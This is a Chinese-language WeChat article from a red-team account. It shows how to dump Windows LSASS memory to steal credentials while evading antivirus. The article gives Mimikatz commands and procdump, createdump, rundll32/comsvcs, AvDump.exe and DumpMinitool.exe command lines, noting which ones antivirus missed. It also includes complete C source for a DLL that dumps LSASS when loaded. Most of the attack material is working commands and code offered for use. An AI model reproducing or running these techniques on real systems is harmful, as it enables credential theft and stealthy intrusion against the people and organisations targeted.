<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vABhX-ajrOa01cZIGWLIDg)

前言
--

获取Windows用户的凭证信息是渗透过程中至关重要的一步。

没杀软，只要有权限想怎么读就怎么读。

有杀软，得用一些特别的技巧。

> 注：本机所有测试均为物理机,且为最新版AV

Mimikatz直接读取Lsass进程
-------------------

权限提升

```
privilege::debug  

```

抓取密码

```
sekurlsa::logonpasswords  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5kUQaFmR0FWUibbXf8gyzucruOfIqgpckqDDcm9sYSHFoOK493wLBwyTDrQG1CC4TJ1rBVfAucVaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

但如果此时目标机器上有AV，必定将收到拦截

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5kUQaFmR0FWUibbXf8gyzucC9RQOxRM2DK9RaYATLla6FPrRIglaWocDpguzcFgWZ6hDzrIbYqIPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

此时mimikatz必须免杀。

一般来说，目标机器有杀软的存在，更倾向于离线解析密码。

白名单文件dump
---------

首先说三个微软签名的白名单程序

1.  Procdump.exe
    
2.  SQLDumper.exe
    
3.  createdump.exe
    

### Procdump.exe(no)

尽管procdump拥有微软签名，但大部分AV厂商对此并不买账。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5kUQaFmR0FWUibbXf8gyzuciaicpfrIKVckjc3owbLQj6MAXjdJ8U8P5nh0agHJicJNqRAfTamwicV46w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
procdump.exe  -ma lsass.exe 1.txt  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5kUQaFmR0FWUibbXf8gyzucPiacawPq3436IpGnkGcIqrqNucBVxKGGENfBicTbicRa8YWzCC1xl4swQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

SQLDumper.exe也是一样的

### createdump.exe(no)

> createdump.exe随着.NET5出现的，本身是个native binary
> 
> 虽然有签名同样遭到AV查杀

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5kUQaFmR0FWUibbXf8gyzucIibzJvcLhKKFicLJSldjOKVwCt7PbqpJx7jFxA7YWgqdKh9A4uCCVBiaA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
createdump.exe -u -f lsass.dmp lsass[PID]  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5kUQaFmR0FWUibbXf8gyzucUerd3Piax407FWN2ce2SKL5KMz7CRbcE8CgIniapy2YicvHXLG4VAEkBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### Rundll32.exe(no)

> 使用rundll32直接执行comsvcs.dll的导出函数`MiniDump`来Dump进程内存

```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id Desktop\lsass-comsvcs.dmp full  

```

同样被查杀

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### avdump.exe(yes)

`AvDump.exe`是`Avast`杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据，它带有Avast杀软数字签名。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

默认路径为：

```
C:\Program Files\Avast Software\Avast  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
AvDump.exe --pid 980 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp  

```

成功dump并解密，全程数字杀软无感。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### DumpMinitool.exe(yes)

此exe为近日`mr.d0x`的某推上分享了的一个LOLBIN，通过vs2022里的`DumpMinitool.exe`来导出`lsass`进程。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

路径为：

```
C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

数字杀软全程无感

```
DumpMinitool.exe --file 1.txt --processId 980 --dumpType Full  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

其他方式
----

### SilentProcessExit进行Dump(no)

具体原理参考文章：[利用SilentProcessExit机制dump内存](https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&mid=2247486890&idx=1&sn=f0fc34f991584547f67424eae680500d&scene=21#wechat_redirect)

> Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。

但该方式需要修改注册表，修改注册表操作将会被查杀。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 编写Dump Lsass的DLL(yes)

1.  获取Debug权限
    
2.  找到lsass的PID
    
3.  使用MiniDump或MiniDumpWriteDump进行内存dump
    

```
#include <stdio.h>  
#include <Windows.h>  
#include <tlhelp32.h>  
  
typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);  
  
int GetLsassPid() {  
  
 PROCESSENTRY32 entry;  
 entry.dwSize = sizeof(PROCESSENTRY32);  
  
 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);  
  
 if (Process32First(hSnapshot, &entry)) {  
  while (Process32Next(hSnapshot, &entry)) {  
   if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {  
    return entry.th32ProcessID;  
   }  
  }  
 }  
  
 CloseHandle(hSnapshot);  
 return 0;  
}  
  
void GetDebugPrivilege()  
{  
 BOOL fOk = FALSE;  
 HANDLE hToken;  
 if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))  
 {  
  TOKEN_PRIVILEGES tp;  
  tp.PrivilegeCount = 1;  
  LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);  
  tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;  
  AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);  
  fOk = (GetLastError() == ERROR_SUCCESS);  
  CloseHandle(hToken);  
 }  
}  
  
void DumpLsass()  
{  
 wchar_t  ws[100];  
 _MiniDumpW MiniDumpW;  
   
 MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");  
 swprintf(ws, 100, L"%u %hs", GetLsassPid(), "c:\\windows\\temp\\temp.bin full");  
  
 GetDebugPrivilege();  
  
 MiniDumpW(0, 0, ws);  
}  
  
BOOL APIENTRY DllMain( HMODULE hModule,  
                       DWORD  ul_reason_for_call,  
                       LPVOID lpReserved  
                     )  
{  
    switch (ul_reason_for_call)  
    {  
    case DLL_PROCESS_ATTACH:  
  DumpLsass();  
  break;  
    case DLL_THREAD_ATTACH:  
    case DLL_THREAD_DETACH:  
    case DLL_PROCESS_DETACH:  
        break;  
    }  
    return TRUE;  
}  

```

成功dump，数字杀软无感。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
加下方wx，拉你入群一起学习:

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

一次简单的内网渗透靶场实战



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247492600&idx=1&sn=869f481ed930f35c5d5e8853acc91d26&chksm=ce675944f910d052745c34180aeb563ed5d39cf586f87924567555a4f562050ff0f60112ae9b&scene=21#wechat_redirect)

[

惊！微软竟爆出如此漏洞



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491914&idx=1&sn=15b89e2e58fdf7fbcbd5fe40f2c09b7c&chksm=ce675bf6f910d2e0ca11aa96ac824b50ba901648ac026c7cb45a2a3ca9275a18889c95a2c62f&scene=21#wechat_redirect)

[

java agent使用与agent内存马



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491885&idx=1&sn=34e6a3f9e2f5e37bd6c10396a6a9d0c3&chksm=ce675b91f910d2872a311a42bbbddbf3eebbe9d1d320cb72dbe98ad4c3ed4ad73a22c447deed&scene=21#wechat_redirect)

[

Spring Beans RCE分析(附带环境源码)



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491627&idx=1&sn=1384bf26136d463eb68ba5b581d541fc&chksm=ce675a97f910d3813bc0ce58cd0fbba0eb141f8b7f3f75a81e29541954ee4d31e8aae6d4b117&scene=21#wechat_redirect)

[

ring0下使用内核重载绕过杀软hook



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491799&idx=1&sn=8bd2a6534c4a221f28cbff577a51a41b&chksm=ce675a6bf910d37d9283e3c712d849cab6f65eff3ec4f87a6cb1921859416c3c7ed219fce490&scene=21#wechat_redirect)

[

初探Listener内存马



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247491386&idx=1&sn=429273c3d0561fa214705c7f20ff8697&chksm=ce64a586f9132c90a38391ebdfb4a7333320b40d9ef33227f16422b183afb4338c70bd658f36&scene=21#wechat_redirect)

[

记一次内网渗透靶场学习



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247490058&idx=1&sn=37b0fab83a32fde96b10c909b14ca264&chksm=ce64a0b6f91329a0164beadd5d8556c35755c3a5bbf804e01f26450037f7408247a4191e7740&scene=21#wechat_redirect)

[

Conntroller内存马详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489969&idx=1&sn=28645d16cc43beddc8c46f1cdbce11e7&chksm=ce64a30df9132a1b46cf703bfc2f5a12d4ce835c050e301f46450fe82f3adba1aecd04f27f58&scene=21#wechat_redirect)

[

从jndi到log4j2



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489628&idx=1&sn=ec7e5a44477e626864c82308a252128f&chksm=ce64a2e0f9132bf61e84bf4c5a9ce3b5c176ecb351c768b3851cd81c2c2ef0ec40ee076f0998&scene=21#wechat_redirect)

[

shiro从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489388&idx=1&sn=d76bbc711e911f96f805f1122fdaea06&chksm=ce64add0f91324c6db3a637c16178df0931e4f0d5cf23704ca95f99e7f2c3f0fedbb1e2d1567&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 53篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)